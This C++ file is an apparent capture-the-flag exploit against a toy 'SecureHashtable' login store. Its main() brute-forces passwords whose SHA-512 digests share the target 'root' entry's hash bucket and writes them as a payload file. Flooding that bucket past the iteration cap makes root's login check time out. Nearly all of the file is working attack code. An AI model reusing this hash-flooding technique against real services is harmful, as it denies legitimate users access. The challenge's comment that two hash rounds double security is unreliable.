#include <openssl/evp.h>

#include <unordered_set>
#include <iostream>
#include <fstream>

#include <unistd.h>

#define MAXIT 1000

using namespace std;

#define EVP_CREATE_FN() EVP_MD_CTX_create()
#define EVP_DESTROY_FN(x) EVP_MD_CTX_destroy(x)

enum auth_result {
    AUTH_FAILURE,
    AUTH_SUCCESS,
    AUTH_TIMEOUT,
};

class SecureHashtable {
private:
    const int MAX_SIZE = 15000;

    public:
        std::unordered_set<std::string> values;

    std::string sha512sum(const std::string& name, const std::string& password) {
        const EVP_MD *md;
        unsigned int md_len;

        md = EVP_get_digestbyname("sha512");

        // Do two sha512 rounds to double the number of security.
        EVP_MD_CTX *mdctx0;
        unsigned char md_value0[EVP_MAX_MD_SIZE];
        mdctx0 = EVP_CREATE_FN();
        EVP_MD_CTX_init(mdctx0);
        EVP_DigestInit_ex(mdctx0, md, NULL);
        EVP_DigestUpdate(mdctx0, name.c_str(), name.size());
        EVP_DigestFinal_ex(mdctx0, md_value0, &md_len);
        EVP_DESTROY_FN(mdctx0);

        unsigned char md_value1[EVP_MAX_MD_SIZE];
        EVP_MD_CTX *mdctx1;
        mdctx1 = EVP_CREATE_FN();
        EVP_MD_CTX_init(mdctx1);
        EVP_DigestInit_ex(mdctx1, md, NULL);
        EVP_DigestUpdate(mdctx1, md_value0, md_len);
        EVP_DigestUpdate(mdctx1, password.c_str(), password.size());
        EVP_DigestFinal_ex(mdctx1, md_value1, &md_len);
        EVP_DESTROY_FN(mdctx1);

        return std::string(reinterpret_cast<char*>(md_value1), md_len);
    }

public:
    SecureHashtable() {
        values.reserve(MAX_SIZE);
    }


    bool insert_keyvalue(const std::string& name, const std::string& password) {
        if (values.size() >= MAX_SIZE)
            return false; // Size limit exceeded.

        std::string digest = sha512sum(name, password);
        values.insert(digest);
        return true;
    }

    size_t lookup_bucket(const std::string& name, const std::string& password) {
        std::string digest = sha512sum(name, password);
        size_t bucket = values.bucket(digest);
        return bucket;
    }

    auth_result lookup_keyvalue(const std::string& name, const std::string& password) {
        std::string digest = sha512sum(name, password);
        size_t bucket = values.bucket(digest);

        auto it = values.begin(bucket), end = values.end(bucket);
        size_t iterations = 0;
        size_t MAX_ITERATIONS = MAXIT;

        while (it != end) {
            if (*it++ == digest)
                return AUTH_SUCCESS;

            // Avoid DoS attacks by fixing upper time limit.
            if (iterations++ >= MAX_ITERATIONS)
                return AUTH_TIMEOUT;
        }

        return AUTH_FAILURE;
    }

};


int main() {
    OpenSSL_add_all_digests();


    std::ofstream ofs("./payload.txt");

    char pwd[32] = "aaaaaaaa";

    SecureHashtable table;

    int bucket = table.lookup_bucket("root", "yee");
    cout << "Bucket: " << bucket << endl;

    int cnt = 0;
    while (1){
        pwd[0] ++;
        for (int j=0; j<8; j++) {
            if (pwd[j] > 'z') {
                pwd[j] = 'a';
                pwd[j+1] ++;
            } else {
                break;
            }
        }
        int b = table.lookup_bucket("yee", pwd);
        if (b == bucket) {
            cnt ++;
            cout << "\rFound " << cnt;
            cout.flush();
            if (cnt > MAXIT + 5) break;
            table.insert_keyvalue("yee", pwd);
            ofs << 1 << endl;
            ofs << "yee" << endl;
            ofs << pwd << endl;
        }
    }
    cout << endl;
    std::cout << "Count: " << table.values.bucket_count() << endl;
    std::cout << "Size: " << table.values.bucket_size(bucket) << endl;
    ofs << 2 << endl;
    ofs << "root" << endl;
    ofs << "yee" << endl;
    cout << table.lookup_keyvalue("root", "yee");
}
